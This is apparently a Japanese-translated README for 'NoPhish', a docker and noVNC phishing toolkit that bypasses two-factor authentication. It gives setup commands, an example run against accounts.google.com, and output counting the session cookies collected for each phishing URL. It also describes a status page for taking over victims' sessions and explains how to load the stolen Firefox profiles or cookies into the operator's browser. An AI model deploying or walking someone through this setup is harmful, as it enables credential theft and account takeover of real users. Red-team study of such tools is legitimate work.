# NoPhish
 
別のフィッシングツールキットで、dockerとnoVNCベースのインフラストラクチャを提供します。全体のセットアップは[mrd0x](https://mrd0x.com/bypass-2fa-using-novnc/)と[fhlipzero](https://fhlipzero.io/blogs/6_noVNC/noVNC.html)の最初の記事に基づいています。

セットアップの詳細な説明はここで確認できます - [Another phishing tool](https://powerseb.github.io/posts/Another-phishing-tool/)

## インストール

dockerがインストールされ動作していることを確認してください。

必要なpythonモジュールをインストールします：

```console
pip install lz4
```
セットアップをインストールします（必要なDockerイメージが作成されます）：


```console
setup.sh install
```

## 実行

セットアップは次のパラメータを提供します：

```console
Usage: ./setup.sh -u No. Users -d Domain -t Target
         -u Number of users - please note for every user a container is spawned so don't go crazy
         -d Domain which is used for phishing
         -t Target website which should be displayed for the user
         -e Export format
         -s true / false if ssl is required - if ssl is set crt and key file are needed
         -c Full path to the crt file of the ssl certificate
         -k Full path to the key file of the ssl certificate
         -a Adjust default user agent string
         -z Compress profile to zip - will be ignored if parameter -e is set
         -p Additional URL parameters - if not set generic URL will be generated

```
基本的な実行例は以下の通りです:


```console
./setup.sh -u 4 -t https://accounts.google.com -d hello.local 
```
実行中に、以下の概要は各URLごとに収集されたクッキーまたはセッション情報の数を示します。


```console
...
[-] Starting Loop to collect sessions and cookies from containers
    Every 60 Seconds Cookies and Sessions are exported - Press [CTRL+C] to stop..
For the url http://hello.local/v1/oauth2/authorize?access-token=b6f13b93-1b51-41c4-b8b4-b07932a45bd6 :
-  0  cookies have been collected.
-  5  session cookies have been collected.
For the url http://hello.local/v2/oauth2/authorize?access-token=fd54dbec-c057-4f46-8657-c0283e5661d9 :
-  0  cookies have been collected.
-  5  session cookies have been collected.
For the url http://hello.local/v3/oauth2/authorize?access-token=9d606939-b805-4c65-9e98-2624de2cd431 :
-  0  cookies have been collected.
-  5  session cookies have been collected.
For the url http://hello.local/v4/oauth2/authorize?access-token=84b8d725-7e87-439e-8629-53332092b68f :
-  0  cookies have been collected.
-  5  session cookies have been collected.
```

ツールは成功したログインに関係なく、すべてのクッキー／セッション情報をエクスポートすることに注意してください。

さらに、ステータスページ - `http(s)://%DOMAIN%:65534/status.php` - でツールと直接対話することもできます。そこではユーザーの切断やセッションの直接引き継ぎが可能です。

現バージョンのツールでは、各ユーザーごとに2つのコンテナが起動されます。1つはデスクトップ用、もう1つはモバイル用です。ユーザーエージェントに基づいてターゲットは適切なコンテナにリダイレクトされます。モバイルコンテナの出力は先頭に「m」が付けられます（例：mphis1-ffprofile）。

## プロファイルエクスポートの使用法
FireFoxの完全なプロファイルエクスポートを使用している場合、以下のように-profileオプションでfirefoxを呼び出すだけです：

Windowsの場合：
`& 'C:\Program Files\Mozilla Firefox\firefox.exe' -profile <PathToProfile>\phis1-ffprofile\`

Linuxの場合：
`firefox-esr -profile <PathToProfile>/phis1-ffprofile --allow-downgrade`

すべてが復元され、最新のサイトも含まれます。

デフォルトではzipアーカイブを展開する必要があるか、パラメータ `-z` を `false` に設定してください。エクスポート形式 `-e simple` を選択した場合、2つのjsonファイルが生成され、これは[Firefox](https://addons.mozilla.org/de/firefox/addon/cookiebro/)および[Chrome](https://chrome.google.com/webstore/detail/cookiebro/lpmockibcakojclnfmhchibmdpmollgn)で利用可能なCookiebroで使用できます。

## クリーンアップ

実行中にスクリプトは `ctrl` + `c` で終了可能で、実行中のすべてのdockerコンテナは削除されます。セットアップを完全に削除するには `setup.sh cleanup` を実行してください。



---

Tranlated By [Open Ai Tx](https://github.com/OpenAiTx/OpenAiTx) | Last indexed: 2025-07-29

---